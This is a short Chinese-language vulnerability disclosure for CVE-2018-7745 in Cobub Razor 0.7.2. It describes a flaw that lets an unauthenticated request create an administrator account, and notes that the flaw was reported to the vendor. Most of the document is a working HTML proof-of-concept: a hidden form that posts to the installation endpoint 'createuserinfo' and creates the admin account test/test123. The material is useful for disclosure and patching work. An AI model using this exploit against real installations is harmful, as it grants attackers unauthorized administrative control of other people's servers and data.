### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Cobub Razor 0.7.2越权增加管理员账户|2018-04-09|ppb（ppb@5ecurity.cn）|[https://github.com/cobub/razor/](https://github.com/cobub/razor/) | [https://github.com/cobub/razor/](https://github.com/cobub/razor/) |0.72| [CVE-2018-7745](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7745)|  

#### 漏洞概述  

> Cobub Razor 0.7.2越权增加管理员账户漏洞，在不登录的情况下发送特定数据包，可新增管理员账号。保存如下利用代码为html页面，打开页面将增加test/test123的管理员账号，漏洞发现者已经将漏洞信息通过[issues](https://github.com/cobub/razor/issues/161)告知作者。   
 

### POC实现代码如下：  

> 利用代码如下：
``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/index.php?/install/installation/createuserinfo" method="POST">
      <input type="hidden" name="siteurl" value="http://127.0.0.1/" />
      <input type="hidden" name="superuser" value="test" />
      <input type="hidden" name="pwd" value="test123" />
      <input type="hidden" name="verifypassword" value="test123" />
      <input type="hidden" name="email" value="12@qq.com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
